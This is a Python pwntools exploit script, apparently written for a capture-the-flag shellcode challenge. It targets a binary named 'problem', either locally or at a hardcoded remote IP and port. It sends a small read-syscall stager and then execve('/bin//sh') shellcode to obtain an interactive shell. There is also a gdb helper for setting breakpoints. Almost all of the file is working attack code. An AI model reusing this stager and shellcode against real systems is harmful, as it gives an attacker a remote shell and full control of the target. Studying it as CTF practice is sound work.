from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './problem'
HOST = '114.177.250.4'
PORT = 2210

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

_64_SHELLCODE = "\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

r = start()
if args.D:
    debug(r, [0x8d7])

payload = ''
payload += asm("lea rsp, [rip+0x40]")
payload += asm("pop rax")
payload += asm("push rsp")
payload += asm("pop rsi")
payload += asm("push rsi")
# payload += asm("lea rsi, [rip+0x200]")
payload += asm("mov dl, 0xff")
payload += asm("syscall")
payload += asm("ret")
# payload += _64_SHELLCODE

r.sendlineafter('shellcode: ', payload)
sleep(0.1)
r.sendline(_64_SHELLCODE)
r.interactive()
r.close()
